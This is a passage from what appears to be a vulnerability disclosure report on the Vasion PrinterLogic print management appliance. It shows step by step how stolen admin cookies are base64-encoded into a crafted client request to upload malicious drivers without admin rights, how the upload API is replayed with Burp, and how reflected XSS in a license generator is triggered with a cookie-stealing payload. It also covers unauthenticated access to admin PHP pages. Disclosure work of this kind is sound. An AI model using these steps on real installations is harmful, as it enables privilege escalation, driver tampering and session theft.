PHPSESSID=a620eea1e1e7f5b0f2ca0cd680e53d63; XSRF-TOKEN=eyJpdiI6Ikh1aDlwRXh2aURhbGptTWdMYk9uOHc9PSIsInZhbHVlIjoibWxqZDZWbGtFYUdZTlwvWDZwWkhBVkhlSEhtVXoza2l6dkVBa1BKQzdZR2dvVU43b1ZkN2lIN00rdG8yYTVSQWoiLCJtYWMiOiJkY2I1ZTU3OWNkYWY4OGUxMzU2ODQ2OWQ2OWRjZjJjNWQ2NjdiODQzMTUwMTllYTk0YjRmMjY0NDg1OTNkNTUwIn0%3D; laravel_session=eyJpdiI6InhtSUxaSFc2U2hXaXBpWHRVRTNlTXc9PSIsInZhbHVlIjoiYUc3dERTcDRpUTBENW9BcWlLNFk1UDgwU2hISTBkQzFENVd0aVdtRzlJSWE2WDhtRFkwUDJHcXVFc29NVHYyXC8iLCJtYWMiOiIyNmE0OTMxMDExYTIyZDc4OWNiNzk0YWRiNjI1M2ZmMmM0NjZiOGRlNTgwMGFmNTE3ODBkMGM0MjQzNzcxY2QzIn0%3D
kali% echo -n $(cat cookies.txt | sed -e 's# ##g;s#%3D#=#g');echo ';'   
PHPSESSID=a620eea1e1e7f5b0f2ca0cd680e53d63;XSRF-TOKEN=eyJpdiI6Ikh1aDlwRXh2aURhbGptTWdMYk9uOHc9PSIsInZhbHVlIjoibWxqZDZWbGtFYUdZTlwvWDZwWkhBVkhlSEhtVXoza2l6dkVBa1BKQzdZR2dvVU43b1ZkN2lIN00rdG8yYTVSQWoiLCJtYWMiOiJkY2I1ZTU3OWNkYWY4OGUxMzU2ODQ2OWQ2OWRjZjJjNWQ2NjdiODQzMTUwMTllYTk0YjRmMjY0NDg1OTNkNTUwIn0=;laravel_session=eyJpdiI6InhtSUxaSFc2U2hXaXBpWHRVRTNlTXc9PSIsInZhbHVlIjoiYUc3dERTcDRpUTBENW9BcWlLNFk1UDgwU2hISTBkQzFENVd0aVdtRzlJSWE2WDhtRFkwUDJHcXVFc29NVHYyXC8iLCJtYWMiOiIyNmE0OTMxMDExYTIyZDc4OWNiNzk0YWRiNjI1M2ZmMmM0NjZiOGRlNTgwMGFmNTE3ODBkMGM0MjQzNzcxY2QzIn0=;
kali% echo -n 'PHPSESSID=a620eea1e1e7f5b0f2ca0cd680e53d63;XSRF-TOKEN=eyJpdiI6Ikh1aDlwRXh2aURhbGptTWdMYk9uOHc9PSIsInZhbHVlIjoibWxqZDZWbGtFYUdZTlwvWDZwWkhBVkhlSEhtVXoza2l6dkVBa1BKQzdZR2dvVU43b1ZkN2lIN00rdG8yYTVSQWoiLCJtYWMiOiJkY2I1ZTU3OWNkYWY4OGUxMzU2ODQ2OWQ2OWRjZjJjNWQ2NjdiODQzMTUwMTllYTk0YjRmMjY0NDg1OTNkNTUwIn0=;laravel_session=eyJpdiI6InhtSUxaSFc2U2hXaXBpWHRVRTNlTXc9PSIsInZhbHVlIjoiYUc3dERTcDRpUTBENW9BcWlLNFk1UDgwU2hISTBkQzFENVd0aVdtRzlJSWE2WDhtRFkwUDJHcXVFc29NVHYyXC8iLCJtYWMiOiIyNmE0OTMxMDExYTIyZDc4OWNiNzk0YWRiNjI1M2ZmMmM0NjZiOGRlNTgwMGFmNTE3ODBkMGM0MjQzNzcxY2QzIn0=;' | base64 -w0
UEhQU0VTU0lEPWE2MjBlZWExZTFlN2Y1YjBmMmNhMGNkNjgwZTUzZDYzO1hTUkYtVE9LRU49ZXlKcGRpSTZJa2gxYURsd1JYaDJhVVJoYkdwdFRXZE1Zazl1T0hjOVBTSXNJblpoYkhWbElqb2liV3hxWkRaV2JHdEZZVWRaVGx3dldEWndXa2hCVmtobFNFaHRWWG96YTJsNmRrVkJhMUJLUXpkWlIyZHZWVTQzYjFaa04ybElOMDByZEc4eVlUVlNRV29pTENKdFlXTWlPaUprWTJJMVpUVTNPV05rWVdZNE9HVXhNelUyT0RRMk9XUTJPV1JqWmpKak5XUTJOamRpT0RRek1UVXdNVGxsWVRrMFlqUm1NalkwTkRnMU9UTmtOVFV3SW4wPTtsYXJhdmVsX3Nlc3Npb249ZXlKcGRpSTZJbmh0U1V4YVNGYzJVMmhYYVhCcFdIUlZSVE5sVFhjOVBTSXNJblpoYkhWbElqb2lZVWMzZEVSVGNEUnBVVEJFTlc5QmNXbExORmsxVURnd1UyaElTVEJrUXpGRU5WZDBhVmR0UnpsSlNXRTJXRGh0UkZrd1VESkhjWFZGYzI5TlZIWXlYQzhpTENKdFlXTWlPaUl5Tm1FME9UTXhNREV4WVRJeVpEYzRPV05pTnprMFlXUmlOakkxTTJabU1tTTBOalppT0dSbE5UZ3dNR0ZtTlRFM09EQmtNR00wTWpRek56Y3hZMlF6SW4wPTs=
</code></pre>
<p>The resulting file is shown. The data contained in base64 must not contain LF (line feed) character to be valid.</p>
<p>File to be used with the PrinterLogic Client:</p>
<pre><code>UPLOAD_DRIVER
aHR0cDo=            base64(http)
MTAuMTA1LjAuMjQx    base64(10.105.0.241)
Lw==                base64(/) 
UEhQU0VTU0lEPWE2MjBlZWExZTFlN2Y1YjBmMmNhMGNkNjgwZTUzZDYzO1hTUkYtVE9LRU49ZXlKcGRpSTZJa2gxYURsd1JYaDJhVVJoYkdwdFRXZE1Zazl1T0hjOVBTSXNJblpoYkhWbElqb2liV3hxWkRaV2JHdEZZVWRaVGx3dldEWndXa2hCVmtobFNFaHRWWG96YTJsNmRrVkJhMUJLUXpkWlIyZHZWVTQzYjFaa04ybElOMDByZEc4eVlUVlNRV29pTENKdFlXTWlPaUprWTJJMVpUVTNPV05rWVdZNE9HVXhNelUyT0RRMk9XUTJPV1JqWmpKak5XUTJOamRpT0RRek1UVXdNVGxsWVRrMFlqUm1NalkwTkRnMU9UTmtOVFV3SW4wPTtsYXJhdmVsX3Nlc3Npb249ZXlKcGRpSTZJbmh0U1V4YVNGYzJVMmhYYVhCcFdIUlZSVE5sVFhjOVBTSXNJblpoYkhWbElqb2lZVWMzZEVSVGNEUnBVVEJFTlc5QmNXbExORmsxVURnd1UyaElTVEJrUXpGRU5WZDBhVmR0UnpsSlNXRTJXRGh0UkZrd1VESkhjWFZGYzI5TlZIWXlYQzhpTENKdFlXTWlPaUl5Tm1FME9UTXhNREV4WVRJeVpEYzRPV05pTnprMFlXUmlOakkxTTJabU1tTTBOalppT0dSbE5UZ3dNR0ZtTlRFM09EQmtNR00wTWpRek56Y3hZMlF6SW4wPTs=

MQ==                base64(1)
</code></pre>
<p>"Sending" the request to the PrinterLogic client:</p>
<pre><code>kali% cp test-req /opt/PrinterInstallerClient/tmp/requests/1-1
</code></pre>
<p>The GUI will appear on the local machine:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-06.png" /></p>
<p>Upload of a driver</p>
<p>Using Burp, we can confirm the upload is done:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-07.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-07-full.png">Click here for full image</a></p>
<p>Upload of a driver</p>
<p>From the logs on the client, we can confirm the upload was successful:</p>
<pre>
2022-02-03 04:14:55,175 (DEBUG): Processing request at '/opt/PrinterInstallerClient/tmp/requests/1-1'
2022-02-03 04:14:55,177 (INFO): Received request: UPLOAD_DRIVER
2022-02-03 04:14:55,177 (INFO): Creating task:
<font color=red>Command: 'UPLOAD_DRIVER'
Arguments: http:,10.105.0.241,/,PHPSESSID=a620eea1e1e7f5b0f2ca0cd680e53d63;XSRF-TOKEN=eyJpdiI6Ikh1aDlwRXh2aURhbGptTWdMYk9uOHc9PSIsInZhbHVlIjoibWxqZDZWbGtFYUdZTlwvWDZwWkhBVkhlSEhtVXoza2l6dkVBa1BKQzdZR2dvVU43b1ZkN2lIN00rdG8yYTVSQWoiLCJtYWMiOiJkY2I1ZTU3OWNkYWY4OGUxMzU2ODQ2OWQ2OWRjZjJjNWQ2NjdiODQzMTUwMTllYTk0YjRmMjY0NDg1OTNkNTUwIn0=;laravel_session=eyJpdiI6InhtSUxaSFc2U2hXaXBpWHRVRTNlTXc9PSIsInZhbHVlIjoiYUc3dERTcDRpUTBENW9BcWlLNFk1UDgwU2hISTBkQzFENVd0aVdtRzlJSWE2WDhtRFkwUDJHcXVFc29NVHYyXC8iLCJtYWMiOiIyNmE0OTMxMDExYTIyZDc4OWNiNzk0YWRiNjI1M2ZmMmM0NjZiOGRlNTgwMGFmNTE3ODBkMGM0MjQzNzcxY2QzIn0=;,,1</font>
User ID: 1000
Group ID: 1000
Use UI: True
Origin: 'PLUGIN'
2022-02-03 04:14:55,178 (DEBUG): Checking if home URL should be changed to: http://10.105.0.241/
2022-02-03 04:14:55,179 (DEBUG): Getting clientsettings.dat from server (or using cache at /opt/PrinterInstallerClient/tmp/data/clientsettings.dat, if up-to-date)
2022-02-03 04:14:55,339 (INFO): Configuring proxy overrides: MANUAL
2022-02-03 04:14:55,339 (DEBUG): HTTP proxy: 127.0.0.1:8080
2022-02-03 04:14:55,339 (DEBUG): HTTPS proxy: 127.0.0.1:8080
2022-02-03 04:14:55,480 (DEBUG): Current cached copy of clientsettings.dat is up-to-date, using local version
2022-02-03 04:14:55,481 (INFO): The home URL is already set to: http://10.105.0.241/
2022-02-03 04:14:55,486 (DEBUG): Getting driver paths and annotation from GUI
<font color=red>2022-02-03 04:15:29,901 (DEBUG): Selected in the GUI: ['/usr/share/ppd/cupsfilters/pxlcolor.ppd'], upload with 'user' credentials</font>
2022-02-03 04:15:29,901 (DEBUG): Uploading drivers to the database
<font color=red>2022-02-03 04:15:29,990 (DEBUG): Found driver components ['/usr/lib/cups/filter/gstopxl']</font>
2022-02-03 04:15:29,999 (INFO): Configuring proxy overrides: MANUAL
2022-02-03 04:15:29,999 (DEBUG): HTTP proxy: 127.0.0.1:8080
2022-02-03 04:15:29,999 (DEBUG): HTTPS proxy: 127.0.0.1:8080
<font color=red>2022-02-03 04:15:30,359 (DEBUG): Attempting to open: http://10.105.0.241/client/gateway.php?confirmupload=1&uploadid=22&packagetype=LINUX&oslist=61&printprocess=&driverdate=09/06/2021&driverversion=1.1&make=HP&modelname=HP%20Color%20LaserJet%20Series%20PCL%206&annotation=upload%20with%20%27user%27%20credentials&inffile=/usr/share/ppd/cupsfilters/pxlcolor.ppd</font>
2022-02-03 04:15:30,360 (INFO): Configuring proxy overrides: MANUAL
2022-02-03 04:15:30,360 (DEBUG): HTTP proxy: 127.0.0.1:8080
2022-02-03 04:15:30,360 (DEBUG): HTTPS proxy: 127.0.0.1:8080
<font color=red>2022-02-03 04:15:31,520 (INFO): Done with request: UPLOAD_DRIVER</font>
2022-02-03 04:15:31,521 (DEBUG): Opening pipe at /opt/PrinterInstallerClient/tmp/responses/1-1 to write response
</pre>

<p>Using the admin credentials, we can confirm the drivers have been uploaded without admin credentials:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-08.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-08-full.png">Click here for full image</a></p>
<p>Listing of uploaded drivers</p>
<p>The current driver is listed as compatible with Linux only - using Burp to replay HTTPS requests, it is possible to change the OS:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-09.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-09-full.png">Click here for full image</a></p>
<p>Listing of uploaded drivers with different OS</p>
<p>The upload is in a 3-step sequence:</p>
<p>1.Getting an upload slot ID:</p>
<pre><code>POST /client/uploadgateway.php HTTP/1.1
needhandle=1&amp;description=Reupload+using+burp&amp;totalsize=3976&amp;totalfragments=1
</code></pre>
<p>This API will then provide an upload slot ID used for the next HTTP request.</p>
<p>2.Uploading the content:</p>
<pre><code>POST /client/uploadgateway.php HTTP/1.1
uploadid=26&amp;fragment=0&amp;fragmentsize=sizeof(base64(data))data=base64(data)
</code></pre>
<p>3.Configuring the driver:</p>
<pre><code>GET /client/gateway.php?confirmupload=1&amp;uploadid=26&amp;packagetype=NORMAL&amp;oslist=10&amp;printprocess=&amp;driverdate=09%2F06%2F2021&amp;driverversion=1.1&amp;make=HP&amp;modelname=HP+Color+LaserJet+Series+PCL+6&amp;annotation=upload+with+%27user%27+credentials&amp;inffile=%2Fusr%2Fshare%2Fppd%2Fcupsfilters%2Fpxlcolor.ppd HTTP/1.1
</code></pre>
<p>The <code>oslist</code> value allows the attacker to specify the target OS.</p>
<p>To be valid, these requests require either the <code>Authorization: Bearer KEY</code> or the <code>x-printerlogic-auth: Bearer KEY</code> headers. These keys appear to be unique for each client installation. To be sure that this exploitation has worked, I reinstalled a dedicated Linux machine with PrinterLogic Client and used the specific user1 user with normal privileges (non-administrator). This machine was never used to reach the server as admin or do any action on the remote server using admin cookies.</p>
<p>In this case, the headers were specific to this machine and the upload also worked:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-10.png" /></p>
<p>Upload request</p>
<p>This authorization code appears to come from the <code>/opt/PrinterInstallerClient/configuration.json</code> configuration file, in the tokens hashtable - this value is specific to each installation of the client and is set during the initial configuration of the client (this may require a temporary registration code).</p>
<p>Token value from the configuration file (before decoding):</p>
<pre><code>21   "tokens": {
22     "null": null,
23     "http://10.105.0.241/": "b'\\xa5A\\xf2\\xb7\\xf8\\x10\\xb1\\x01\\xf6P\\xba\\xb8(K\\xae\\xa7\\xea\\xc2\\xb0eC\\xff[\\xcd\\xa2e\\xe6p\\xb9j\\xe1\\x1egH\    \xd4\\xea\\xcc!\\x07\\x9d'"
24   },
</code></pre>
<p>The upload also worked for <code>user1</code>:</p>
<p><img alt="" src="images/2025-vasion-report-1-admin-cookie-11.png" /></p>
<p><a href="images/2025-vasion-report-1-admin-cookie-11-full.png">Click here for full image</a></p>
<p>Upload from user1 from a dedicated machine never linked to any PrinterLogic admin activity</p>
<p>There are 2 verifications done by the upload process:</p>
<ul>
<li>Checking of the PHP sessions to verify whether the current user has administrator privileges (that can be bypassed by getting <code>admin</code> cookies when visiting <code>/admin/</code>)</li>
<li>Checking of a hardcoded token that is set during the initial installation/configuration of the PrinterLogic Client.</li>
</ul>
<p>There is also a race condition between the first and the second upload requests - when an administrator is uploading a driver, another user with admin privileges can upload malicious drivers by brute-forcing the upload slot id in the second http request: the upload mechanism is not linked to a specific administrator's session but only uses the public upload slot id.</p>
<p>It was not possible to exploit this race condition from a user without cookies with elevated privileges (using the cookies retrieving when login to http://printerlogic-url/).</p>
<p>When using <code>local</code> users, the appliance/SaaS is vulnerable to privilege escalation, allowing to compromise drivers.</p>
<p>Installations using Azure Single Sign On authentication are secure because the authentication is blocked by Microsoft and doesn't reach the PrinterLogic server.</p>
<p><a id="va-xss-01"></a></p>
<h2>Details - XSS in the license generator and weak encryption algorithm</h2>
<p>The custom <code>encryption</code> algorithm to generate license key is very weak and can be easily bypassed.</p>
<p>Furthermore, the appliance provides a working licence generator located in <code>/var/www/app/license_gen.php</code>.</p>
<p>The code contains XSS in lines 117 and 253:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">60</span>  <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">rs</span>(<span style="color: #19177C">$n</span>,<span style="color: #19177C">$def</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;&quot;</span>,<span style="color: #19177C">$n2</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;&quot;</span>) {
 <span style="color: #666666">61</span>         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n</span>])) {
 <span style="color: #666666">62</span>                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$n2</span>)<span style="color: #666666">||</span>(<span style="color: #666666">!</span><span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n2</span>]))) {
 <span style="color: #666666">63</span>                         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$def</span>;
 <span style="color: #666666">64</span>                 } <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n2</span>];
 <span style="color: #666666">65</span>         }  <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n</span>];
 <span style="color: #666666">66</span>  }
[<span style="color: #666666">...</span>]
<span style="color: #666666">114</span>  <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">fd</span>(<span style="color: #19177C">$n</span>) {
<span style="color: #666666">115</span>         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$n</span>)) <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;&quot;</span>;
<span style="color: #666666">116</span>         <span style="color: #19177C">$res</span><span style="color: #666666">=</span>_fd(<span style="color: #19177C">$n</span>);
<span style="color: #666666">117</span>         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$res</span><span style="color: #666666">===</span><span style="color: #008000; font-weight: bold">false</span>) <span style="color: #008000; font-weight: bold">die</span>(<span style="color: #BA2121">&quot;The date specified &#39;</span><span style="color: #BB6688; font-weight: bold">$n</span><span style="color: #BA2121">&#39; could not be parsed.&quot;</span>); <span style="color: #408080; font-style: italic">// [1] XSS with $n</span>
<span style="color: #666666">118</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$res</span>;
<span style="color: #666666">119</span> 
<span style="color: #666666">120</span>  }
[<span style="color: #666666">...</span>]
<span style="color: #666666">248</span> <span style="color: #666666">&lt;?</span>php
<span style="color: #666666">249</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$needconfirm</span>) {
<span style="color: #666666">250</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;font style=&#39;color: red&#39;&gt;</span>
<span style="color: #BA2121">251         THE DATE YOU SPECIFIED IS QUESTIONABLE, </span>
<span style="color: #BA2121">252         ARE YOU REALLY SURE THATS WHAT YOU MEANT TO PUT IN THERE?&lt;br/&gt;&lt;br/&gt;</span>
<span style="color: #BA2121">253         I PARSED IT AS: &quot;</span><span style="color: #666666">.</span>fd(rs(<span style="color: #BA2121">&#39;expiry&#39;</span>))<span style="color: #666666">.</span><span style="color: #BA2121">&quot; &lt;/font&gt;&lt;br /&gt;&lt;div&gt;&quot;</span>;             <span style="color: #408080; font-style: italic">// [2] XSS with rs(&#39;expiry&#39;)</span>
<span style="color: #666666">254</span> }
<span style="color: #666666">255</span> <span style="color: #BC7A00">?&gt;</span>
</pre></div>

<p>The value <code>rs("expiry")</code> comes from <code>$_REQUEST["expiry"]</code>. The value must respect some conditions in <code>_fd()</code> (related to the length on line 90, not shown) to exploit the XSS on line 253.</p>
<p>An incorrect value will be shown without being escaped using <code>die()</code>, allowing the XSS on line 117. It is recommended to escape the value of <code>rs("expiry")</code> on line 253 and to patch the line 117.</p>
<p>In other parts of the files, there are also XSS because the PHP code used <code>htmlentities()</code> to escape HTML. It is still possible to inject single quotes and add JavaScript. For example, in lines 261 and 289.</p>
<p>XSS in <code>license_gen.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">261</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span><span style="color: #666666">.</span><span style="color: #008000">htmlentities</span>(rs(<span style="color: #BA2121">&#39;expiry&#39;</span>))<span style="color: #666666">.</span><span style="color: #BA2121">&quot;&#39; name=&#39;confirm&#39; /&gt;&quot;</span>;
[<span style="color: #666666">...</span>]
<span style="color: #666666">289</span> <span style="color: #666666">&lt;</span>input name<span style="color: #666666">=</span><span style="color: #BA2121">&quot;expiry&quot;</span> type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;text&quot;</span> value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo htmlentities(fd(rs(&#39;expiry&#39;))); ?&gt;&quot;</span> <span style="color: #666666">/&gt;&lt;</span>br <span style="color: #666666">/&gt;</span>
[<span style="color: #666666">...</span>]
</pre></div>

<p>A PoC has been provided using the PHP code from <code>license_gen.php</code>:</p>
<p>Content of <code>test.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span>  <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">rs</span>(<span style="color: #19177C">$n</span>,<span style="color: #19177C">$def</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;&quot;</span>,<span style="color: #19177C">$n2</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;&quot;</span>) {
  <span style="color: #666666">3</span>         <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n</span>])) {
  <span style="color: #666666">4</span>                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$n2</span>)<span style="color: #666666">||</span>(<span style="color: #666666">!</span><span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n2</span>]))) {
  <span style="color: #666666">5</span>                         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$def</span>;
  <span style="color: #666666">6</span>                 } <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n2</span>];
  <span style="color: #666666">7</span>         }  <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #19177C">$n</span>];
  <span style="color: #666666">8</span>  }
  <span style="color: #666666">9</span> 
 <span style="color: #666666">10</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;input type=&#39;hidden&#39; value=&#39;&quot;</span><span style="color: #666666">.</span><span style="color: #008000">htmlentities</span>(rs(<span style="color: #BA2121">&#39;expiry&#39;</span>))<span style="color: #666666">.</span><span style="color: #BA2121">&quot;&#39; name=&#39;confirm&#39; /&gt;&quot;</span>;
 <span style="color: #666666">11</span> 
 <span style="color: #666666">12</span> <span style="color: #BC7A00">?&gt;</span>
</pre></div>

<p>When <code>bla'%20onload='alert(document.cookie)</code> is injected, there is a XSS:</p>
<pre><code>kali% curl "http://127.0.0.1/test.php?expiry=bla'%20onload='alert(document.cookie)"
&lt;input type='hidden' value='bla' onload='alert(document.cookie)' name='confirm' /&gt;
</code></pre>
<p><code>license_gen.php</code> contains 13 XSS with <code>htmlentitites()</code>.</p>
<p>The script also works and provides valid licenses:</p>
<p><img alt="" src="images/2025-vasion-report-1-keygen-02.png" /></p>
<p><a href="images/2025-vasion-report-1-keygen-02-full.png">Click here for full image</a></p>
<p>An attacker may use this license generator file to steal cookies of administrators.</p>
<p><a id="va-incorrect-acl-php"></a></p>
<h2>Details - Incorrect Access Control to PHP webpages allowing to reach printers</h2>
<p>A huge number of webpages are directly reachable outside regular PHP routes.</p>
<p>This allows an attacker to bypass authentication mechanism.</p>
<p>For example, <code>http://target/admin/design/role_description.php</code> is freely reachable:</p>
<pre><code>kali% curl http://10.105.0.241/admin/design/role_description.php
&lt;div style="margin: 8px;"&gt;      
&lt;h1&gt;Administrative Roles&lt;/h1&gt;
&lt;h2&gt;Root&lt;/h2&gt;
&lt;h3&gt;The root user has all permissions.&lt;/h3&gt;
&lt;br /&gt;
&lt;h2&gt;Administrator:&lt;/h2&gt;
&lt;h3&gt;Administrators have all permissions except permission to change the root user password.&lt;/h3&gt; 
&lt;br /&gt;
&lt;h2&gt;Manager:&lt;/h2&gt;
&lt;h3&gt;Managers have permissions to do the following:&lt;/h3&gt; 
&lt;ul&gt;&lt;li&gt;View and export all print job audit records.&lt;/li&gt;
&lt;li&gt;Add, delete, and edit printer objects the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Add, delete, and edit folder objects the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Edit printer General, Port, Drivers, Deploy, Portal Security settings&lt;/li&gt;
&lt;li&gt;Edit folder General and Portal Security tab settings&lt;/li&gt;
&lt;li&gt;Add drivers to the driver/profile repository&lt;/li&gt;
&lt;li&gt;Delete drivers from the driver/profile repository if the driver is only associated to printers the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Replace drivers in the driver/profile repository if the driver is only associated to printers the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Add profiles to the driver/profile repository&lt;/li&gt;
&lt;li&gt;Delete profiles from the driver/profile repository if the profile is only associated to printers the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Edit profiles in the driver/profile repository if the profile is only associated to printers the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Add, delete, and edit IP address range objects the user has been given permission to manage&lt;/li&gt;
&lt;li&gt;Edit IP Address range General and Deploy tab settings&lt;/li&gt;&lt;/ul&gt; 
&lt;br /&gt;
&lt;h2&gt;Deployer:&lt;/h2&gt;
&lt;h3&gt;Deployers have permissions to do the following:&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Edit deploy tab settings of printer or IP address range objects the user has been given permission to manage&lt;/li&gt;&lt;/ul&gt;
&lt;/div&gt; 
kali%
</code></pre>
<p>Other pages will provide path disclosure, e.g. <code>/console_release/km/OpenAPI.php</code>:</p>
<pre><code>kali% curl http://10.105.0.241/console_release/km/OpenAPI.php
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Use of undefined constant ABSPATH - assumed 'ABSPATH' (this will throw an Error in a future version of PHP) in &lt;b&gt;/var/www/app/public/console_release/km/OpenAPI.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  require_once(ABSPATHlib/dao/my_sql/data_access.php): failed to open stream: No such file or directory in &lt;b&gt;/var/www/app/public/console_release/km/OpenAPI.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Fatal error&lt;/b&gt;:  require_once(): Failed opening required 'ABSPATHlib/dao/my_sql/data_access.php' (include_path='.:/usr/local/lib/php') in &lt;b&gt;/var/www/app/public/console_release/km/OpenAPI.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;
</code></pre>
<p>When reaching some pages, we can get PHP errors in the appliance - some code is executed because there is no authentication but there are PHP errors (undefined variables) during the execution. Some of the code is supposed to be included in other PHP files.</p>
<p>Testing reachable PHP files in the <code>/admin/design/reports</code> directory:</p>
<pre><code>kali% for i in chart_image.php global.php overview_application_usage.php overview_color.php overview_environmental.php overview_main.php overview_page_count.php overview_paper_size.php overview_popup.php overview_pull_printing.php overview_summary.php overview_time_of_day.php overview_total_per_week.php print_job_folder.php print_job_others.php print_job_records.php print_job_user_manager_department_printer.php; do wget http://10.105.0.241/admin/design/reports/$i;done
</code></pre>
<p>Some PHP errors will be produced on the server:</p>
<pre><code>Feb  1 01:06:46 printerlogic va/printercloud_pi.1.6x121o9j76phpwxma6fzk3ga3[1398]: 2022/02/01 01:06:46 [error] 98#98: *81 FastCGI sent in stderr: "PHP message: [2022-02-01 01:06:46] production.ERROR: {"instance":"10.105.0.241","dbname":"app_pi","dbhost":"mysql","originator":"http:\/\/10.105.0.241\/admin\/design\/reports\/overview_application_usage.php","route":"admin\/{dir1?}\/{dir2?}\/{dir3?}\/{dir4?}\/{dir5?}"} [dd.trace_id=4753636673719875765 dd.span_id=4753636673719875765] array_shift() expects parameter 1 to be array, null given {"exception":"[object] (ErrorException(code: 0): array_shift() expects parameter 1 to be array, null given at /var/www/app/admin/design/reports/overview_application_usage.php:12)"} []
Feb  1 01:06:46 printerlogic va/printercloud_pi.1.6x121o9j76phpwxma6fzk3ga3[1398]: PHP message: [2022-02-01 01:06:46] production.ERROR: {"instance":"10.105.0.241","dbname":"app_pi","dbhost":"mysql","originator":"http:\/\/10.105.0.241\/admin\/design\/reports\/overview_application_usage.php","route":"admin\/{dir1?}\/{dir2?}\/{dir3?}\/{dir4?}\/{dir5?}"} [dd.trace_id=4753636673719875765 dd.span_id=4753636673719875765] array_shift() expects parameter 1 to be array, null given {"exception":"[object] (ErrorException(code: 0): array_shift() expects parameter 1 to be array, null given at /var/www/app/admin/design/reports/overview_application_usage.php:12)"} []" while reading response header from upstream, client: 172.17.130.44, server: ~^(?&lt;subdomain&gt;[^.]+)\..*$, request: "GET /admin/design/reports/overview_application_usage.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php-fpm.sock:", host: "10.105.0.241"
